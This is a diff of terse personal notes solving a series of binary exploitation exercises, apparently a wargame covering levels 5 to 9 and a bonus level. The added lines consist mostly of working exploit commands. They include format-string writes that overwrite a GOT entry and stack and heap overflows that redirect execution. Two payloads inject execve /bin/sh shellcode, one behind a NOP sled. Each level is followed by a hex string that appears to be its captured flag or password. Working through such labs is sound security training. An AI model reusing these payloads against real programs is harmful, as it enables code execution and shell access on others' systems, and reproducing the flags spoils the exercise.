@@ -10,6 +10,7 @@ info variables
 
 Current level :
 
+[ INCORRECT ]
 m address : 0xbffff71c
 m address formatted : \x1c\xf7\xff\xbf
 
@@ -22,6 +23,40 @@ address of m 1st byte formatted : \x1f\xf7\xff\xbf
 address of m 2nd byte formatted : \x1e\xf7\xff\xbf
 address of m 3rd byte formatted : \x1d\xf7\xff\xbf
 address of m 4th byte formatted : \x1c\xf7\xff\xbf
+[ INCORRECT ]
+
+
+m address : 0x080483d2
+m address formatted : \xd2\x83\x04\x08
+
+address of m 1st byte : 0x080483d2
+address of m 2nd byte : 0x080483d3
+address of m 3rd byte : 0x080483d4
+address of m 4th byte : 0x080483d5
+
+address of m 1st byte formatted : \xd2\x83\x04\x08
+address of m 2nd byte formatted : \xd3\x83\x04\x08
+address of m 3rd byte formatted : \xd4\x83\x04\x08
+address of m 4th byte formatted : \xd5\x83\x04\x08
+
+
+m address : 0x08049838
+m address formatted : \x38\x98\x04\x08
+
+address of m 1st byte : 0x08049838
+address of m 2nd byte : 0x08049839
+address of m 3rd byte : 0x0804983a
+address of m 4th byte : 0x0804983b
+
+address of m 1st byte formatted : \x38\x98\x04\x08
+address of m 2nd byte formatted : \x39\x98\x04\x08
+address of m 3rd byte formatted : \x3a\x98\x04\x08
+address of m 4th byte formatted : \x3b\x98\x04\x08
+
+
+
+
+
 
 
 Wanted value :
@@ -34,10 +69,10 @@ Address of o => 0x080484a4
 - `0xa4` or `164`
 
 
-- Write value `0x08` to address `0xbffff71f`
-- Write value `0x04` to address `0xbffff71e`
-- Write value `0x84` to address `0xbffff71d`
-- Write value `0xa4` to address `0xbffff71c`
+- Write value `0x08` to address `0x080483d5`
+- Write value `0x04` to address `0x080483d4`
+- Write value `0x84` to address `0x080483d3`
+- Write value `0xa4` to address `0x080483d2`
 
 
 
@@ -56,5 +91,101 @@ buffer start at $4
 
 divide by 4, add 3, get index
 
-python -c 'print("____%27$hhn____%28$hhn______________________________________________________________\x1c\xf7\xff\xbf\x1d\xf7\xff\xbf\x1e\xf7\xff\xbf\x1f\xf7\xff\xbf______________________________________________%26$hhn________________________________%25$hhn")'
-python -c 'print("____%27$xxx____%28$xxx______________________________________________________________\x1c\xf7\xff\xbf\x1d\xf7\xff\xbf\x1e\xf7\xff\xbf\x1f\xf7\xff\xbf______________________________________________%26$xxx________________________________%25$xxx")'
+python -c 'print("____%27$hhn____%28$hhn______________________________________________________________\xd2\x83\x04\x08\xd3\x83\x04\x08\xd4\x83\x04\x08\xd5\x83\x04\x08______________________________________________%26$hhn________________________________%25$hhn")'
+python -c 'print("____%27$xxx____%28$xxx______________________________________________________________\xd2\x83\x04\x08\xd3\x83\x04\x08\xd4\x83\x04\x08\xd5\x83\x04\x08______________________________________________%26$xxx________________________________%25$xxx")'
+
+
+python -c 'print("____%27$hhn____%28$hhn______________________________________________________________\x38\x98\x04\x08\x39\x98\x04\x08\x3a\x98\x04\x08\x3b\x98\x04\x08______________________________________________%26$hhn________________________________%25$hhn")'
+python -c 'print("____%27$xxx____%28$xxx______________________________________________________________\x38\x98\x04\x08\x39\x98\x04\x08\x3a\x98\x04\x08\x3b\x98\x04\x08______________________________________________%26$xxx________________________________%25$xxx")'
+
+
+python -c 'print("\x38\x98\x04\x08____\x39\x98\x04\x08________________________________________________________________________________________________________________________%6$hhn________________________________%4$hhn")'
+( python -c 'print("\x38\x98\x04\x08____\x39\x98\x04\x08________________________________________________________________________________________________________________________%6$hhn________________________________%4$hhn")' ; cat ) | ./level5
+
+
+080483d0 <exit@plt>:
+ 80483d0:       ff 25 38 98 04 08       jmp    *0x8049838
+ 80483d6:       68 28 00 00 00          push   $0x28
+ 80483db:       e9 90 ff ff ff          jmp    8048370 <_init+0x3c>
+
+
+
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
+
+
+
+
+
+
+======================================= 6 ===========================================
+
+
+
+./level6 $(python -c 'print("A" * 72 + "\x54\x84\x04\x08")')
+
+
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
+
+
+
+========================================== 7 ===========================================
+
+./level7 $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
+
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+
+
+
+
+======================================== 8 ===========================================
+
+auth 
+
+service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+login
+
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+
+
+====================================== 9 ============================================
+
+   0x0804867c <+136>:   mov    0x10(%esp),%eax
+        => move value of esp+16 / 0xbffff620 ( 0x0804a078 ) into %eax
+
+   0x08048680 <+140>:   mov    (%eax),%eax
+        => move value of eax / 0x0804a078 ( WHAT YOU PUT THERE ) into eax
+
+   0x08048682 <+142>:   mov    (%eax),%edx
+        => move value of eax / SPOOFED S2 (SPOOFED S2 + 1 JUMP) into edx
+
+    By now :
+        addr1 = eax
+        addr2 = edx, val of eax
+        addr3 = val of edx
+
+
+   0x08048684 <+144>:   mov    0x14(%esp),%eax
+   0x08048688 <+148>:   mov    %eax,0x4(%esp)
+   0x0804868c <+152>:   mov    0x10(%esp),%eax
+   0x08048690 <+156>:   mov    %eax,(%esp)
+
+
+
+
+   0x08048693 <+159>:   call   *%edx
+        => should call the function at address of the value of edx
+        If (*edx == POINTER TO NOP SEQUENCE BEFORE SHELLCODE) =>
+
+
+./level9 $(python -c 'print("\x10\xa0\x04\x08" + "\x14\xa0\x04\x08" + "\x90" * 55 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x0c\xa0\x04\x08")')
+
+
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+
+=============================== b0 ==================================
+
+
+( python -c 'print("\x90" * 8 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68")' ; python -c 'print("\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\x08\xf6\xff\xbf" + "BBBBBBB")' ; cat ) | ./bonus0
